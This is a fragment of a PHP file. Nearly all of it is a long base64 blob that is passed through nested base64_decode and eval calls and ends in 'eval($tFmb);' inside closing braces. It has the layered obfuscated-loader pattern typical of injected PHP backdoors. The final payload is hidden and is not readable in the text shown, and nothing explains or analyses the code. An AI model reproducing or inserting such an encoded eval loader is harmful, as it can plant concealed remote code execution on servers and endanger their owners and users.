V1l6RlhiRnAwVkZob1ZWWXphSHBXTUdSWFUxWkdkRkpzU2s1U1dFRjNWakZrZDFReFRuTmlNMnhXWVRKb2IxVXdWa3RqVm5CWFZtdDBhbUpIZUhoVk1XaHZZVVpKZDFkc2JGVmhNbEp5V1ZkNFNtVnRSa2xVYkdoWFlsZG9VVmRYZEZkak1VNUhWVzVXV0dKWGVIQlphMVozWkd4WmVGVnJPVlppUnprMVZsZDRjMVpXWkVkWGEzUmFWbTFSZDFwRVJsSmxiR3Q2V2taU1RsSlVWbFJYVmxKTFlURk9jMUpZWkZOaVZGWlZWbXhWTVZFeFpIRlJiazVUVW14YWVGVlhNVzlWTURGMVducEtWMUpXY0ZOVVZscDNaRVpTZFZWc1pHbGlhMHA0VmxjMWQyTXdNVmRpUkZwVVlrZFNWRlJXWkRSWFZscElZMFZPYUZaVVFqTlpibkJIVmxaS2MxSllhRnBXZWtaUVdrVmFZV1JIUmtoa1JrNU9WbXh2ZVZaWWNFZFViVkYzWXpOc1ZWZEhlRmhaVjNSTFZqRnNjMWR0Um1waVIzaFlXVlZXTUdGV1NuUmtSRnBYVm0xTk1WVjZSa3BsUms1MFQxWndiR0V6UWpKWFZscHJVMjFXVjFOdVZtbFNNRnBVV1d0YWRrMVdaRmhrUlRscVlsWktTRlZYTlZkV1YwcFpZVWhDV21KR2NFeFdhMXByWXpKR1JrOVhkRTVoTW5jeFZrZDRiMlF4YkZkV1dHeGhVMGRTVmxSVVNsTmxWbFY1WkVVNVZtSlZWak5VYkZaVFdWVXhkVlZyZUZaTlZscFFWVmQ0ZG1ReVNrWlZiRXBYVFd4S1RGWldVa05UTWs1ellrWmtZVkpzY0hCVVZXaFRWbXhzTmxGVVJsTlNiVGsxV2tWV01GVnJNVmhhUkU1WFVqTlNVRmx0TVVaa01rNUlUVlphVjFKRlJURlZNalYzWlcxRmVGcElWbE5pUjJoaFZsUkNSazVXVGxaVWJYQm9UV3RhU0ZsVldsZGhiRlYzVWxSV1ZGWlhVa3haVldST1pWWmFWVk5yT1ZOaGJYaDVWako0YTFReVVuTmpSV2hYVm5wc1RGVnFTbE5TTVhCWVpVYzFhbEpVYXpGVlZ6RTBZVEpLVmxkdWNGUk5SVFZVV1dwR2ExSXhWblZoUlhoWFUwVTFNVlpJY0V0V01ERnpZa1pvYTAxcWJFeFZiVFZEVGtaYWNWTnJXbXBTVkd0NlZVWlJkMkpyT1RWVmJFWlhUVEJhYUZOVlVYZGFNSEExVldwS1ZsWnVRalZUVlZGM1dqRnNkRkp1Y0dGV1JtdDNWMFJLVTJKR2EzbFBWM1JoVlRKa2NscFhlR3ROUmxaVVlYcGtTbEl4V1hsWFZtUXpZakJ3U1Zkc1NsaGlhMngzVkROc2FrNHhjRmxYYldocFVUSmtjbFpWV210bFJtUndZWHBqYms5NVVsQmxTRTVTU1VRd1owcDVVa3BWYms1WlNVUXdaMWx0Um5wYVZGa3dXREpTYkZreU9XdGFVMmRyV2pCd1lXVkRhemRKUjFZeVdWZDNiMHBGYkZOak1XZHdUM2xqTjFwWVdtaGlRMmRyVkROb2VsVlRhemNuT3lSUmVFUnlJRDBnSnlSTmVIcFhJRDBnWW1GelpUWTBYMlJsWTI5a1pTZ2tTSE5hVkNrN0lHVjJZV3dvSkUxNGVsY3BPeWM3WlhaaGJDZ2tVWGhFY2lrNyc7JFFlWGEgPSAnJHNRelcgPSBiYXNlNjRfZGVjb2RlKCRvSVhRKTsgZXZhbCgkc1F6Vyk7JztldmFsKCRRZVhhKTs=');eval($tFmb);
    }
}
	